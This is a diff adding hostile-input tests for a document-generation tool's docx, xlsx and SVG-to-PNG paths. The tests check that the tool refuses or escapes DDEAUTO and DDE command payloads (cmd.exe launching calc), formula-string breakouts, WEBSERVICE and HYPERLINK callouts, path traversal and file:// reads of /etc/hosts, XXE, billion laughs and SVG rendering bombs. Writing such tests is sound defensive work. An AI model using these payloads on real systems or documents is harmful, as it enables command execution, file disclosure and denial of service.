@@ -270,3 +270,120 @@ describe.skipIf(!typst)('png through make_file', () => {
     expect(media.some(([n]) => n.endsWith('.svg'))).toBe(false)
   })
 })
+
+// ---- hostile input (review of #1295) ----
+
+describe('hostile: many colours', () => {
+  test('5,000 different colours are refused at once, before any styles work', () => {
+    const spans = Array.from({ length: 5000 }, (_, i) => ({ t: 'Span', c: [['', [], [['color', `#${i.toString(16).padStart(6, '0')}`]]], [{ t: 'Str', c: 'x' }]] }))
+    const t0 = performance.now()
+    expect(() => markTextColors({ blocks: [{ t: 'Para', c: spans }] })).toThrow(/more than 64 different text colours/)
+    expect(performance.now() - t0).toBeLessThan(500)
+  })
+  test('colorStyles is one pass: 64 marks over 5,000 styles stay fast', () => {
+    const marks = new Map(Array.from({ length: 64 }, (_, i) => [`Color ${i.toString(16).padStart(6, '0').toUpperCase()}`, { color: '000000' }]))
+    const styles = '<w:styles>' + Array.from({ length: 5000 }, (_, i) => `<w:style w:type="character" w:styleId="s${i}"><w:name w:val="${i < 64 ? `Color ${i.toString(16).padStart(6, '0').toUpperCase()}` : `Other ${i}`}" /></w:style>`).join('') + '</w:styles>'
+    const t0 = performance.now()
+    const out = colorStyles(styles, marks)
+    expect(performance.now() - t0).toBeLessThan(500)
+    expect((out.match(/<w:rPr>/g) ?? []).length).toBe(64)
+  })
+})
+
+describe.skipIf(!pandoc)('hostile: docx header text', () => {
+  test('raw XML in a header or footer is text, never markup', async () => {
+    const out = 'users/alice/hostile-header.docx'
+    const evil = '</w:t></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r>'
+    const r = await call('make_file', { format: 'docx', output: out, content: '# a\n', page: { header: evil, footer: { left: evil } } })
+    expect(r.isError, r.text).toBe(false)
+    const p = partText(out)
+    for (const part of ['word/header-mk1.xml', 'word/footer-mk1.xml']) {
+      expect(p.get(part)).not.toContain('<w:instrText')
+      expect(p.get(part)).not.toContain('<w:fldChar')
+      expect(p.get(part)).toContain('&lt;w:instrText&gt;DDEAUTO')
+      wellFormed(p.get(part)!)
+    }
+  })
+})
+
+describe('hostile: xlsx rule values and formulas', () => {
+  test('a quote in a contains / equal value cannot leave its string', async () => {
+    const out = 'users/alice/hostile-cf.xlsx'
+    const breakout = 'x",A1)),HYPERLINK("http://example.com/?q="&A1,"y'
+    const r = await call('make_file', { format: 'xlsx', output: out, content: '| A | B |\n|---|---|\n| 1 | 2 |\n',
+      sheets: [{ conditional: [{ range: 'A2:A2', when: 'contains', value: breakout }, { range: 'B2:B2', when: 'equal', value: breakout }] }] })
+    expect(r.isError, r.text).toBe(false)
+    const s = partText(out).get('xl/worksheets/sheet1.xml')!
+    const quoted = '&quot;' + breakout.replace(/"/g, '&quot;&quot;').replace(/&(?!quot;)/g, '&amp;') + '&quot;'
+    expect(s).toContain(`<formula>NOT(ISERROR(SEARCH(${quoted},A2)))</formula>`)
+    expect(s).toContain(`<formula>${quoted}</formula>`)
+  })
+
+  test('a DDE or outside formula in a rule is refused', async () => {
+    for (const formula of ["=cmd|' /C calc'!A0", '=[1]Sheet1!A1>0', '=WEBSERVICE("http://example.com")', '=HYPERLINK("http://example.com")']) {
+      const out = `users/alice/hostile-dde-${formula.length}.xlsx`
+      const r = await call('make_file', { format: 'xlsx', output: out, content: '| A |\n|---|\n| 1 |\n', sheets: [{ conditional: [{ range: 'A2:A2', when: 'formula', formula }] }] })
+      expect(r.isError, `${formula}: ${r.text}`).toBe(true)
+      expect(fs.existsSync(file(out))).toBe(false)
+    }
+  })
+})
+
+describe.skipIf(!typst)('hostile: SVG', () => {
+  const svgWith = (inner: string) => `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><rect width="100" height="100" fill="white"/>${inner}</svg>`
+  let n = 0
+  async function png(content: string) {
+    const out = `users/alice/hostile/${++n}.png`
+    const r = await call('make_file', { format: 'png', output: out, content })
+    return { ...r, saved: fs.existsSync(file(out)) }
+  }
+
+  test('a picture linked by absolute path, ../, file:// or http is never read', async () => {
+    fs.mkdirSync(file('users/alice/hostile'), { recursive: true })
+    fs.writeFileSync(file('users/alice/hostile/secret.png'), Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGNoAAAAggCBd81ytgAAAABJRU5ErkJggg==', 'base64'))
+    for (const href of [file('users/alice/hostile/secret.png'), '../secret.png', '../../../../../etc/hosts', 'file:///etc/hosts', 'http://127.0.0.1:9/x.png', 'secret.png']) {
+      const r = await png(svgWith(`<image href="${href}" xlink:href="${href}" width="100" height="100"/>`))
+      expect(r.isError, href).toBe(true)
+      expect(r.saved).toBe(false)
+      expect(r.text).toContain('could not be drawn')
+      // the server's own folders stay out of the message
+      expect(r.text).not.toContain(A.data)
+    }
+  })
+
+  test('XXE, billion laughs and a <use> bomb are refused quickly', async () => {
+    const xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hosts">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="0" y="50">&x;</text></svg>'
+    const ents = ['<!ENTITY a "aaaaaaaaaa">', ...'bcdefgh'.split('').map((ch, i) => `<!ENTITY ${ch} "${`&${'abcdefgh'[i]};`.repeat(10)}">`)].join('')
+    const lol = `<?xml version="1.0"?><!DOCTYPE svg [${ents}]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="0" y="50">&h;</text></svg>`
+    let defs = '<rect id="a0" width="1" height="1"/>'
+    for (let i = 1; i <= 30; i++) defs += `<g id="a${i}"><use href="#a${i - 1}"/><use href="#a${i - 1}" x="1"/></g>`
+    const bomb = svgWith(`<defs>${defs}</defs><use href="#a30"/>`)
+    for (const svg of [xxe, lol, bomb]) {
+      const t0 = Date.now()
+      const r = await png(svg)
+      expect(r.isError, r.text).toBe(true)
+      expect(r.saved).toBe(false)
+      expect(r.text).not.toContain('localhost')
+      expect(Date.now() - t0).toBeLessThan(15_000)
+    }
+  })
+
+  test('more than 50 filter effects are refused before drawing', async () => {
+    const r = await png(svgWith('<filter id="f">' + '<feGaussianBlur stdDeviation="1"/>'.repeat(51) + '</filter>'))
+    expect(r.isError).toBe(true)
+    expect(r.text).toContain('51 filter effects')
+  })
+
+  test('a heavy blur picture under that count stops at the time or memory limit', async () => {
+    let body = '<defs><filter id="f" x="-10" y="-10" width="20" height="20"><feGaussianBlur stdDeviation="800"/></filter></defs>'
+    for (let i = 0; i < 40; i++) body += `<rect x="${i}" width="1900" height="1900" fill="#${(i * 99991).toString(16).slice(-6).padStart(6, '0')}" filter="url(#f)"/>`
+    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="2000" height="2000">${body}</svg>`
+    const t0 = Date.now()
+    const r = await png(svg)
+    // without the limits this ran a full minute at 4.4 GB; with them it stops at the memory limit in about a second
+    expect(r.isError).toBe(true)
+    expect(r.text).toMatch(/took too long|too much memory/)
+    expect(r.saved).toBe(false)
+    expect(Date.now() - t0).toBeLessThan(30_000)
+  }, 40_000)
+})
